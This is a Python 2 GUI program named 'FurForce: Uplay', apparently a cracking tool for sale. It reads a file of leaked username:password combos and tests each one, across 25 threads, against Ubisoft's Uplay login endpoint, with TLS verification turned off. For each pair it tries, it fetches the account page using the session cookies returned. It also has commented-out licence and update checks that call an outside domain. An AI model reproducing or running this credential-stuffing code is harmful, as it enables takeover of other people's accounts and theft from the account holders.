# -*- coding: utf-8 -*-
__author__ = 'Furry~'
import concurrent.futures
import requests
import requests.exceptions
import sys
import uuid
import Tkinter as Tk
import base64
import json
from cookielib import Cookie, CookieJar
from tkFileDialog import askopenfilename


class App():
    def __init__(self, parent):

        # Check To See If You Purchased c:
        # self.ownercheck()

        # Check To See If There's An Update
        # self.updatecheck()

        # Setup Window
        self.window = parent
        self.window.title('FurForce: Uplay')

        # Set Variables
        self.fileopenoptions = dict(defaultextension='.txt', filetypes=[('Text file', '*.txt'), ('All files', '*.*')])
        self.combos = Tk.StringVar(self.window)

        # Make Widgets
        self.labelcombos = Tk.Label(self.window, text="Combo List: ")
        self.entrycombos = Tk.Entry(self.window, textvariable=self.combos)
        self.startbutton = Tk.Button(self.window, text="Start!", command=self.start)
        self.combosbutton = Tk.Button(self.window, text="Open Combo File!", command=self.setcombos)

        # Grid Widgets
        self.labelcombos.grid(row=0, column=0, sticky=Tk.W)
        self.entrycombos.grid(row=0, column=1, columnspan=4, sticky=Tk.W+Tk.E+Tk.N+Tk.S)
        self.combosbutton.grid(row=0, column=5, sticky=Tk.W+Tk.E+Tk.N+Tk.S)
        self.startbutton.grid(row=1, column=0, columnspan=6, sticky=Tk.W+Tk.E+Tk.N+Tk.S)

    def ownercheck(self):
        r = requests.get('http://coinsgo.in/spotify.php?hwid={0}'.format(str(uuid.getnode())),
                         proxies={})
        if 'truelikeurmumspot' in r.text:
            print "You own this c:!"
        else:
            print "You do not own this. Please go away :c!"
            sys.exit("ur poop")

    def updatecheck(self):
        r = requests.get('http://coinsgo.in/version.xml',
                         proxies={})
        if '1.0.0.0' in r.text:
            print "Up to date!"
        else:
            print "Please visit http://coinsgo.in/ to update"

    def makeCookie(self, name, value):
        return Cookie(
            version=0,
            name=name,
            value=value,
            port=None,
            port_specified=False,
            domain="uplayconnect.ubi.com",
            domain_specified=True,
            domain_initial_dot=False,
            path="/",
            path_specified=True,
            secure=False,
            expires=None,
            discard=False,
            comment=None,
            comment_url=None,
            rest=None
        )

    def uplay(self, userpass):
        global work
        work = True
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0',
            'Ubi-AppId': '314d4fef-e568-454a-ae06-43e3bece12a6',
            'Ubi-RequestedPlatformType': 'uplay',
            'Authorization': 'Basic {0}'.format(base64.b64encode(userpass)),
            'Content-Type': 'application/json; charset=utf-8'
        }
        while work:
            cj = CookieJar()
            try:
                response = requests.post(
                    'https://uplayconnect.ubi.com/ubiservices/v2/profiles/sessions',
                    '{}',
                    timeout=7.5,
                    headers=headers,
                    verify=False,
                    cookies=cj
                )
                js = json.loads(response.text)
                for cookie in js:
                    cj.set_cookie(self.makeCookie(cookie, js[cookie]))
                work = False
                r = requests.get(
                    'http://uplay.ubi.com/',
                    cookies=cj
                )
                print r.text
            except requests.exceptions.HTTPError:
                print "HTTP Error!"
                work = True
            except requests.exceptions.ConnectionError:
                print "Connection Error!"
                work = True
            except requests.exceptions.Timeout:
                print "Timeout Error!"
                work = True

    def start(self):
        if self.entrycombos.get() == '':
            print 'You didn\'t add any combos!'
        else:
            with open(self.entrycombos.get(), 'r') as f:
                global userpass
                userpass = f.readlines()
                f.close()
        with concurrent.futures.ThreadPoolExecutor(max_workers=25) as x:
            for userpasscombo in userpass:
                x.submit(self.uplay, userpasscombo)

    def setcombos(self):
        filename = askopenfilename(**self.fileopenoptions)
        self.combos.set(filename)

if __name__ == "__main__":
    root = Tk.Tk()
    app = App(root)
    root.mainloop()